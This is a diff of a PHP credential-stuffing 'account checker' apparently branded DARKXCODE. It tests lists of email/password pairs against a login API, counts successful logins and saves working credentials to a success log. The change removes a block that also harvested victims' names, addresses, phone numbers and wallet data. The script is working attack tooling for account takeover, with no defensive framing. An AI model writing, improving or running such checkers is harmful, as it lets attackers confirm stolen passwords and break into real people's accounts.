@@ -65,42 +65,11 @@ foreach ($lists as $list) {
     curl_close($ch);
     $js = json_decode($x, TRUE);
 
-
-    $gateWay2 = strtoupper($gateWay);
+    $msg = $js['data']['msg'];
 
     if (strpos($x, 'SUCCESS LOGIN!')) {
         $live++;
-
-        $msg = $js['data']['msg'];
-        $name = $js['data']['info']['name'];
-        $billing_address = $js['data']['info']['billing_address'];
-        $city = $js['data']['info']['city'];
-        $state = $js['data']['info']['state'];
-        $postcode = $js['data']['info']['postcode'];
-        $wallet = $js['data']['info']['wallet'];
-        $country = $js['data']['info']['country'];
-        $phone = $js['data']['info']['phone'];
-        $e_mail = $js['data']['info']['email'];
-
-        $outt = "
-========================[$msg]==========================
-    EMAIL    : $e_mail
-    PASSWORD : $pwd
-    [INFO ACCOUNT]
-    NAME     : $name
-    PHONE    : $phone
-    ADDRESS  : $billing_address
-    CITY     : $city
-    STATE    : $state
-    POSTCODE : $postcode
-    COUNTRY  : $country
-    WALLET   : $wallet
-
-";
-
-
         save_file("result/success-log.txt", "$list");
-        save_file("result/info-success-log.txt", "$outt");
         echo "$WH [$YL$iniJam$WH][$RD$no$DEF/$GR$total$DEF]$GR SUCCESS LOGIN$DEF =>$BL $list$DEF | [$YL MSG$DEF: $CY$msg$DEF ] | BY$MG DARKXCODE$DEF (V1)" . PHP_EOL;
     } else if (strpos($x, 'VALID EMAIL ADDRESS!')) {
         $Vem++;
